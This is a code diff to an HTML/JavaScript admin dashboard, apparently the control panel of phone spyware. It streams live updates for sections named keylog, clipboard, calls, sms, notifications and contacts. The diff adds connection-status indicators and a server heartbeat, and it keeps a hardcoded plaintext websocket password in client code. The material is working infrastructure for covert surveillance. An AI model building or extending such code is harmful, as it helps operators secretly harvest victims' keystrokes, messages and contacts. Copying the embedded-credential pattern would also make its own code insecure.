@@ -183,9 +183,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
       </div>
       <div class="topbar-right">
         <button onclick="window.location.href='/admin/logout'" style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:6px;padding:4px 12px;color:#ef4444;font-size:11px;cursor:pointer" title="Logout">Logout</button>
-        <span class="rt-badge"><span class="rt-dot"></span> Real-time</span>
+        <span class="rt-badge" id="wsBadge"><span class="rt-dot" id="wsDot"></span> <span id="wsStatus">Real-time</span></span>
         <span class="status-dot" id="statusDot"></span>
-        <span class="status-text" id="statusText">Online</span>
+        <span class="status-text" id="statusText">Live</span>
       </div>
     </div>
     <!-- Content -->
@@ -424,25 +424,23 @@ const ws = io(window.location.origin, { transports: ['websocket', 'polling'] });
 
 ws.on('connect', () => {
   wsConnected = true;
-  // Kirim auth password
   ws.emit('auth', { password: 'Kosay378%' });
 });
 
 ws.on('auth_ok', () => {
-  console.log('[WS] Authenticated - real-time aktif');
-  document.getElementById('statusText').textContent = 'Real-time';
+  document.getElementById('wsStatus').textContent = 'Real-time';
+  document.getElementById('wsDot').style.background = '#00A550';
 });
 
 ws.on('auth_error', () => {
-  console.log('[WS] Auth failed');
+  document.getElementById('wsStatus').textContent = 'Auth Failed';
+  document.getElementById('wsDot').style.background = '#ef4444';
 });
 
 ws.on('update', (msg) => {
-  // Data baru masuk — refresh section yang aktif
   let active = document.querySelector('.section.active');
   if (active) {
     let id = active.id.replace('sec-', '');
-    // Auto-refresh section yang relevan
     let refreshMap = {
       'keylog': 'keylog', 'clipboard': 'clipboard', 'calls': 'calls',
       'sms': 'sms', 'notifications': 'notif', 'contacts': 'contacts',
@@ -458,10 +456,29 @@ ws.on('update', (msg) => {
 
 ws.on('disconnect', () => {
   wsConnected = false;
-  document.getElementById('statusText').textContent = 'Offline';
+  document.getElementById('wsStatus').textContent = 'Reconnect...';
+  document.getElementById('wsDot').style.background = '#f59e0b';
 });
 
-// ============ END REAL-TIME ============
+// ============ SERVER HEARTBEAT (Live indicator) ============
+async function checkServer() {
+  try {
+    let r = await fetch('/admin/login');
+    if (r.ok || r.status === 302) {
+      document.getElementById('statusText').textContent = 'Live';
+      document.getElementById('statusDot').style.background = '#00A550';
+    } else {
+      throw new Error('bad status');
+    }
+  } catch (e) {
+    document.getElementById('statusText').textContent = 'Dead';
+    document.getElementById('statusDot').style.background = '#ef4444';
+  }
+}
+setInterval(checkServer, 10000); // cek tiap 10 detik
+checkServer();
+
+// ============ END REAL-TIME & HEARTBEAT ============
 
 // Overview
 async function loadOverview(){
